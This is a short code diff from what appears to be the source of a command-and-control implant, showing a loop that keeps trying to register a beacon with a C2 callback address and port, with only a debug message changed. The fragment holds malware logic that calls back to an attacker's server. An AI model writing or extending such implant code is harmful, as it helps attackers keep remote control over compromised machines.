@@ -71,7 +71,7 @@ void main()
     while (!BeaconRegisterC2(_C2_CALLBACK_ADDRESS, _C2_CALLBACK_PORT, _CALLBACK_USER_AGENT, (LPCWSTR)UriBuffer, dwSize))
     {
         // not much we can do really if we cant hit the c2, guess we just wait an retry.
-        DEBUG("Failed to connect\n");
+        DEBUG("FAILED: BeaconRegisterC2");
         Sleep(_CALLBACK_JITTER);
     }
 
